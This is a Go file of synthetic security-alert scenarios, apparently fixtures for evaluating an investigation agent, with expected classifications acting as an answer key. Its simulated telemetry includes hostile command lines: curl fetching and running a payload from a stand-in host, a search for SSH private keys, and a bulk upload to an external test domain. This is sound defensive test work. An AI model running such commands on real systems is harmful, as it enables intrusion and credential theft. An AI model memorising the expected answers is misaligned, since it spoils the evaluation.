package scenario

import (
	"encoding/json"
	"fmt"
	"sort"
	"time"

	domain "sentinel/internal/agentdomain"
)

// Scenario is a self-contained, synthetic investigation fixture. Only Alert is
// presented to the controller initially; Events remain behind tool adapters.
type Scenario struct {
	ID             string
	Name           string
	Description    string
	Alert          domain.Alert
	Scope          domain.Scope
	Entities       []domain.Entity
	Events         []domain.Event
	Calls          []Call
	Expected       Expected
	FailOnceSource string
}

type Call struct {
	ID        string
	Question  string
	Tool      string
	Arguments map[string]any
	DependsOn []string
}

type Expected struct {
	AnalyzerClassification string
	Classification         string
	Status                 string
	RequiredEventIDs       []string
	RequiredTools          []string
	MissingEvidence        []string
}

func Catalog() []Scenario {
	result := []Scenario{
		webRCE(),
		sshAccountTakeover(),
		containerEscape(),
		kubernetesServiceAccountAbuse(),
		filelessInjection(),
		credentialExfiltration(),
		normalOperations(),
		degradedTelemetry(),
	}
	sort.Slice(result, func(i, j int) bool { return result[i].ID < result[j].ID })
	return result
}

func Find(id string) (Scenario, bool) {
	for _, item := range Catalog() {
		if item.ID == id {
			return item, true
		}
	}
	return Scenario{}, false
}

func (s Scenario) Validate() error {
	if s.ID == "" || s.Name == "" || s.Alert.ID == "" || s.Scope.ID == "" {
		return fmt.Errorf("scenario identity, alert and scope are required")
	}
	if s.Alert.TenantID != s.Scope.TenantID {
		return fmt.Errorf("scenario %s alert tenant is outside scope", s.ID)
	}
	if len(s.Calls) == 0 || len(s.Calls) > 8 {
		return fmt.Errorf("scenario %s must define 1 to 8 calls", s.ID)
	}
	seen := map[string]struct{}{}
	for _, call := range s.Calls {
		if call.ID == "" || call.Tool == "" || call.Question == "" || call.Arguments == nil {
			return fmt.Errorf("scenario %s contains an incomplete call", s.ID)
		}
		if _, exists := seen[call.ID]; exists {
			return fmt.Errorf("scenario %s repeats task %s", s.ID, call.ID)
		}
		seen[call.ID] = struct{}{}
	}
	for _, event := range s.Events {
		if err := event.Validate(); err != nil {
			return fmt.Errorf("scenario %s event %s: %w", s.ID, event.ID, err)
		}
		if !s.Scope.Contains(event) {
			return fmt.Errorf("scenario %s event %s is outside scope", s.ID, event.ID)
		}
	}
	return nil
}

type fixture struct {
	scenario Scenario
	base     time.Time
	host     string
	boot     string
	tenant   string
	sensor   string
}

func newFixture(id, name, description, host string) *fixture {
	base := time.Date(2026, 9, 21, 10, 0, 0, 0, time.UTC)
	tenant := "tenant-demo"
	scope := domain.Scope{ID: "scope-" + id, TenantID: tenant, Start: base.Add(-10 * time.Minute), End: base.Add(10 * time.Minute), AllowedHosts: []string{host}, SnapshotID: "snapshot-" + id}
	alert := domain.Alert{ID: "alert-" + id, TenantID: tenant, Severity: "critical", Title: name, SeedEventID: "", CreatedAt: base}
	f := &fixture{scenario: Scenario{ID: id, Name: name, Description: description, Alert: alert, Scope: scope}, base: base, host: host, boot: "boot-demo", tenant: tenant, sensor: "sensor-demo"}
	f.entity(alert.ID, domain.EntityAlert, map[string]any{"title": name})
	f.entity(host, domain.EntityHost, map[string]any{"hostname": host, "environment": "demo"})
	return f
}

func (f *fixture) entity(id string, kind domain.EntityType, attributes map[string]any) {
	raw, _ := json.Marshal(attributes)
	f.scenario.Entities = append(f.scenario.Entities, domain.Entity{ID: id, Type: kind, TenantID: f.tenant, ScopeID: f.scenario.Scope.ID, SnapshotID: f.scenario.Scope.SnapshotID, Attributes: raw})
}

func (f *fixture) event(id string, offset time.Duration, kind domain.EventKind, process, parent, container, session, identity string, details map[string]any) {
	raw, _ := json.Marshal(details)
	observed := f.base.Add(offset)
	f.scenario.Events = append(f.scenario.Events, domain.Event{ID: id, SchemaVersion: 1, TenantID: f.tenant, SensorID: f.sensor, HostID: f.host, BootID: f.boot, ContainerID: container, ProcessID: process, ParentProcess: parent, SessionID: session, IdentityID: identity, Kind: kind, Outcome: domain.OutcomeSuccess, ObservedAt: observed, IngestedAt: observed.Add(time.Second), Details: raw})
	if f.scenario.Alert.SeedEventID == "" {
		f.scenario.Alert.SeedEventID = id
	}
}

func (f *fixture) call(id, question, tool string, args map[string]any, dependsOn ...string) {
	f.scenario.Calls = append(f.scenario.Calls, Call{ID: id, Question: question, Tool: tool, Arguments: args, DependsOn: dependsOn})
}

func (f *fixture) finish(classification, status string, events ...string) Scenario {
	f.scenario.Expected = Expected{AnalyzerClassification: classification, Classification: classification, Status: status, RequiredEventIDs: events}
	for _, call := range f.scenario.Calls {
		f.scenario.Expected.RequiredTools = append(f.scenario.Expected.RequiredTools, call.Tool)
	}
	return f.scenario
}

func queryArgs(kinds ...domain.EventKind) map[string]any {
	return entityQueryArgs("scope", "tree", kinds...)
}

func entityQueryArgs(entity, relation string, kinds ...domain.EventKind) map[string]any {
	values := make([]string, len(kinds))
	for i := range kinds {
		values[i] = string(kinds[i])
	}
	return map[string]any{"entity_ref": entity, "relation": relation, "event_types": values, "limit": int64(50), "cursor": nil}
}

func alertArgs(id string) map[string]any { return map[string]any{"alert_ref": id} }

func webRCE() Scenario {
	f := newFixture("web-rce", "WebShell到载荷执行和外联", "Web入口触发Shell、临时文件落地、执行和公网外联", "host-web-01")
	f.scenario.Scope.AllowedWorkloads = []string{"container-web-01"}
	f.entity("container-web-01", domain.EntityContainer, map[string]any{"pod": "payment-api-7d8f", "namespace": "production", "image": "registry.example.test/payment-api:1.8.2"})
	f.entity("request-web-01", domain.EntityRequest, map[string]any{"method": "POST", "path": "/api/import", "source_ip": "198.51.100.23"})
	f.event("web-001", 0, domain.EventHTTPRequest, "proc-java", "", "container-web-01", "", "", map[string]any{"request_ref": "request-web-01", "source_ip": "198.51.100.23", "method": "POST", "path": "/api/import"})
	f.event("web-002", time.Second, domain.EventProcessExec, "proc-sh", "proc-java", "container-web-01", "", "", map[string]any{"exe": "/bin/sh", "parent_exe": "/usr/bin/java"})
	f.event("web-003", 2*time.Second, domain.EventProcessExec, "proc-curl", "proc-sh", "container-web-01", "", "", map[string]any{"exe": "/usr/bin/curl", "argv": []string{"curl", "https://payload.example.test/update"}})
	f.event("web-004", 3*time.Second, domain.EventFileCreate, "proc-curl", "proc-sh", "container-web-01", "", "", map[string]any{"file_ref": "file-web-payload", "path": "/tmp/update.bin"})
	f.event("web-005", 4*time.Second, domain.EventFileChmod, "proc-sh", "proc-java", "container-web-01", "", "", map[string]any{"file_ref": "file-web-payload", "path": "/tmp/update.bin", "mode": "0755"})
	f.event("web-006", 5*time.Second, domain.EventProcessExec, "proc-payload", "proc-sh", "container-web-01", "", "", map[string]any{"exe": "/tmp/update.bin"})
	f.event("web-007", 6*time.Second, domain.EventDNSQuery, "proc-payload", "proc-sh", "container-web-01", "", "", map[string]any{"domain_ref": "domain-payload", "query": "payload.example.test"})
	f.event("web-008", 7*time.Second, domain.EventNetworkConnect, "proc-payload", "proc-sh", "container-web-01", "", "", map[string]any{"destination_ip_ref": "ip-c2", "destination_ip": "203.0.113.77", "destination_port": 443})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "检查Web入口", "web_access_events_query", queryArgs(domain.EventHTTPRequest, domain.EventWAFDecision), "T1")
	f.call("T3", "还原进程树", "process_events_query", queryArgs(domain.EventProcessExec), "T1")
	f.call("T4", "检查文件落地", "file_events_query", queryArgs(domain.EventFileCreate, domain.EventFileChmod), "T3")
	f.call("T5", "检查DNS", "dns_events_query", queryArgs(domain.EventDNSQuery), "T3")
	f.call("T6", "检查网络外联", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T3")
	return f.finish("SUSPICIOUS", "COMPLETED", "web-002", "web-004", "web-006", "web-008")
}

func sshAccountTakeover() Scenario {
	f := newFixture("ssh-takeover", "SSH账号入侵与持久化", "失败登录后成功认证、sudo提权、写入SSH key并外联", "host-ssh-01")
	f.entity("identity-alice", domain.EntityIdentity, map[string]any{"name": "alice", "uid": 1001})
	f.entity("session-ssh-01", domain.EntitySession, map[string]any{"type": "SSH", "source_ip": "203.0.113.20"})
	f.entity("ip-ssh-source", domain.EntityIP, map[string]any{"address": "203.0.113.20", "zone": "internet"})
	f.event("ssh-001", -3*time.Minute, domain.EventLoginFailure, "sshd", "", "", "", "identity-alice", map[string]any{"source_ip_ref": "ip-ssh-source", "method": "password"})
	f.event("ssh-002", -2*time.Minute, domain.EventLoginFailure, "sshd", "", "", "", "identity-alice", map[string]any{"source_ip_ref": "ip-ssh-source", "method": "password"})
	f.event("ssh-003", -time.Minute, domain.EventLoginSuccess, "sshd", "", "", "session-ssh-01", "identity-alice", map[string]any{"source_ip_ref": "ip-ssh-source", "method": "publickey"})
	f.event("ssh-004", -time.Minute, domain.EventSessionLogin, "sshd", "", "", "session-ssh-01", "identity-alice", map[string]any{"source_ip_ref": "ip-ssh-source", "session_type": "SSH"})
	f.event("ssh-005", 0, domain.EventSudo, "proc-sudo", "proc-shell", "", "session-ssh-01", "identity-alice", map[string]any{"target_uid": 0})
	f.event("ssh-006", time.Second, domain.EventFileCreate, "proc-root-shell", "proc-sudo", "", "session-ssh-01", "identity-alice", map[string]any{"file_ref": "file-authorized-keys", "path": "/root/.ssh/authorized_keys"})
	f.event("ssh-007", 2*time.Second, domain.EventFileCreate, "proc-root-shell", "proc-sudo", "", "session-ssh-01", "identity-alice", map[string]any{"file_ref": "file-cron", "path": "/etc/cron.d/system-update"})
	f.event("ssh-008", 3*time.Second, domain.EventNetworkConnect, "proc-root-shell", "proc-sudo", "", "session-ssh-01", "identity-alice", map[string]any{"destination_ip": "192.0.2.80", "destination_port": 8443})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "查询登录会话", "login_sessions_query", entityQueryArgs(f.host, "self", domain.EventSessionLogin, domain.EventSessionLogout), "T1")
	f.call("T3", "查询认证尝试", "authentication_events_query", entityQueryArgs("identity-alice", "self", domain.EventLoginSuccess, domain.EventLoginFailure, domain.EventKeyAuth), "T1")
	f.call("T4", "查询权限变化", "privilege_events_query", entityQueryArgs("identity-alice", "self", domain.EventSudo, domain.EventSetUID), "T2")
	f.call("T5", "查询持久化文件", "file_events_query", queryArgs(domain.EventFileCreate), "T4")
	f.call("T6", "查询外联", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T4")
	return f.finish("SUSPICIOUS", "COMPLETED", "ssh-003", "ssh-005", "ssh-006", "ssh-007")
}

func containerEscape() Scenario {
	f := newFixture("container-escape", "容器逃逸尝试", "容器进程进入宿主命名空间并挂载宿主文件系统", "host-k8s-01")
	f.scenario.Scope.AllowedWorkloads = []string{"container-escape-01"}
	f.entity("container-escape-01", domain.EntityContainer, map[string]any{"pod": "image-worker", "namespace": "production", "privileged": true})
	f.event("escape-001", 0, domain.EventProcessExec, "proc-ns-helper", "proc-worker", "container-escape-01", "", "", map[string]any{"exe": "/tmp/ns-helper"})
	f.event("escape-002", time.Second, domain.EventSetNS, "proc-ns-helper", "proc-worker", "container-escape-01", "", "", map[string]any{"namespace": "mnt", "target_pid": 1, "target_is_host_namespace": true})
	f.event("escape-003", 2*time.Second, domain.EventMount, "proc-ns-helper", "proc-worker", "container-escape-01", "", "", map[string]any{"source": "/dev/sda1", "target": "/mnt/host", "host_path": true})
	f.event("escape-004", 3*time.Second, domain.EventChroot, "proc-ns-helper", "proc-worker", "container-escape-01", "", "", map[string]any{"path": "/mnt/host"})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "读取容器上下文", "container_context_get", map[string]any{"container_ref": "container-escape-01"}, "T1")
	f.call("T3", "检查高危内核行为", "kernel_security_events_query", queryArgs(domain.EventSetNS, domain.EventMount, domain.EventChroot), "T2")
	f.call("T4", "检查关联进程", "process_events_query", queryArgs(domain.EventProcessExec), "T2")
	return f.finish("SUSPICIOUS", "COMPLETED", "escape-002", "escape-003", "escape-004")
}

func kubernetesServiceAccountAbuse() Scenario {
	f := newFixture("k8s-service-account", "Kubernetes ServiceAccount滥用", "业务Pod异常访问API并创建特权DaemonSet", "host-k8s-02")
	f.scenario.Scope.AllowedWorkloads = []string{"container-payment-01"}
	f.entity("container-payment-01", domain.EntityContainer, map[string]any{"pod": "payment-api", "namespace": "production"})
	f.entity("workload-payment", domain.EntityWorkload, map[string]any{"service_account": "payment-api", "namespace": "production"})
	f.event("k8s-001", 0, domain.EventDNSQuery, "proc-app", "", "container-payment-01", "", "", map[string]any{"query": "kubernetes.default.svc", "domain_ref": "domain-k8s-api"})
	f.event("k8s-002", time.Second, domain.EventNetworkConnect, "proc-app", "", "container-payment-01", "", "", map[string]any{"destination_ip": "10.96.0.1", "destination_port": 443})
	f.event("k8s-003", 2*time.Second, domain.EventK8sAPIRequest, "proc-app", "", "container-payment-01", "", "", map[string]any{"verb": "list", "resource": "secrets", "principal": "system:serviceaccount:production:payment-api"})
	f.event("k8s-004", 3*time.Second, domain.EventK8sAPIRequest, "proc-app", "", "container-payment-01", "", "", map[string]any{"verb": "create", "resource": "daemonsets", "privileged": true, "host_path": "/"})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "读取工作负载上下文", "k8s_workload_context_get", map[string]any{"workload_ref": "workload-payment"}, "T1")
	f.call("T3", "检查DNS", "dns_events_query", queryArgs(domain.EventDNSQuery), "T1")
	f.call("T4", "检查API连接", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T1")
	f.call("T5", "检查Kubernetes审计", "k8s_audit_events_query", queryArgs(domain.EventK8sAPIRequest), "T2")
	return f.finish("SUSPICIOUS", "COMPLETED", "k8s-003", "k8s-004")
}

func filelessInjection() Scenario {
	f := newFixture("fileless-injection", "无文件执行与进程注入", "memfd样式执行后通过ptrace操作其他进程", "host-app-01")
	f.event("memfd-001", 0, domain.EventProcessExec, "proc-memfd", "proc-app", "", "", "", map[string]any{"exe": "/proc/self/fd/7", "memfd": true})
	f.event("memfd-002", time.Second, domain.EventPtrace, "proc-memfd", "proc-app", "", "", "", map[string]any{"target_pid": 4242, "operation": "POKEDATA", "cross_security_boundary": true})
	f.event("memfd-003", 2*time.Second, domain.EventNetworkConnect, "proc-target", "proc-app", "", "", "", map[string]any{"destination_ip": "203.0.113.99", "destination_port": 443})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "检查执行事件", "process_events_query", queryArgs(domain.EventProcessExec), "T1")
	f.call("T3", "检查进程注入", "kernel_security_events_query", queryArgs(domain.EventPtrace), "T2")
	f.call("T4", "检查注入后的外联", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T3")
	return f.finish("SUSPICIOUS", "COMPLETED", "memfd-001", "memfd-002")
}

func credentialExfiltration() Scenario {
	f := newFixture("credential-exfiltration", "凭据搜索和疑似外传", "搜索SSH密钥、创建临时归档并连接罕见公网目标", "host-data-01")
	f.event("cred-001", 0, domain.EventProcessExec, "proc-find", "proc-shell", "", "", "", map[string]any{"exe": "/usr/bin/find", "argv": []string{"find", "/", "-name", "id_rsa"}})
	f.event("cred-002", time.Second, domain.EventFileCreate, "proc-tar", "proc-shell", "", "", "", map[string]any{"path": "/tmp/archive.dat", "file_ref": "file-archive"})
	f.event("cred-003", 2*time.Second, domain.EventDNSQuery, "proc-uploader", "proc-shell", "", "", "", map[string]any{"query": "upload.example.test"})
	f.event("cred-004", 3*time.Second, domain.EventNetworkConnect, "proc-uploader", "proc-shell", "", "", "", map[string]any{"destination_ip": "198.51.100.90", "destination_port": 443, "bytes_sent": 10485760})
	f.event("cred-005", 4*time.Second, domain.EventFileDelete, "proc-shell", "", "", "", "", map[string]any{"path": "/tmp/archive.dat", "file_ref": "file-archive"})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "检查凭据搜索进程", "process_events_query", queryArgs(domain.EventProcessExec), "T1")
	f.call("T3", "检查归档创建和删除", "file_events_query", queryArgs(domain.EventFileCreate, domain.EventFileDelete), "T2")
	f.call("T4", "检查DNS", "dns_events_query", queryArgs(domain.EventDNSQuery), "T2")
	f.call("T5", "检查数据外联", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T2")
	return f.finish("SUSPICIOUS", "COMPLETED", "cred-001", "cred-002", "cred-004")
}

func normalOperations() Scenario {
	f := newFixture("normal-operations", "合法运维负样本", "经批准且符合基线的缓存轮转任务", "host-ops-01")
	f.event("ops-001", 0, domain.EventProcessExec, "proc-ops-shell", "proc-java", "", "", "", map[string]any{"exe": "/bin/bash", "script": "/opt/ops/rotate-cache.sh", "approved_automation": true})
	f.event("ops-002", time.Second, domain.EventFileWrite, "proc-ops-shell", "proc-java", "", "", "", map[string]any{"path": "/var/cache/catalog/index.db", "approved_automation": true})
	f.event("ops-003", 2*time.Second, domain.EventProcessExit, "proc-ops-shell", "proc-java", "", "", "", map[string]any{"exit_code": 0})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "检查进程", "process_events_query", queryArgs(domain.EventProcessExec, domain.EventProcessExit), "T1")
	f.call("T3", "检查文件操作", "file_events_query", queryArgs(domain.EventFileWrite), "T2")
	f.call("T4", "检查是否存在外联", "network_connections_query", queryArgs(domain.EventNetworkConnect), "T2")
	s := f.finish("NO_ATTACK_EVIDENCE", "NEEDS_REVIEW", "ops-001", "ops-002")
	s.Expected.Classification = "INCONCLUSIVE"
	return s
}

func degradedTelemetry() Scenario {
	f := newFixture("degraded-telemetry", "遥测缺失与工具失败", "事件查询首次失败且遥测覆盖不完整", "host-gap-01")
	f.event("gap-001", 0, domain.EventProcessExec, "proc-suspicious", "proc-service", "", "", "", map[string]any{"exe": "/tmp/unknown"})
	f.call("T1", "读取种子告警", "alert_get", alertArgs(f.scenario.Alert.ID))
	f.call("T2", "检查可用进程证据", "process_events_query", queryArgs(domain.EventProcessExec), "T1")
	f.call("T3", "检查遥测覆盖", "telemetry_health_get", map[string]any{"scope_ref": f.scenario.Scope.ID}, "T1")
	s := f.finish("INCONCLUSIVE", "NEEDS_REVIEW", "gap-001")
	s.FailOnceSource = "events"
	s.Expected.MissingEvidence = []string{"遥测健康数据不完整"}
	return s
}
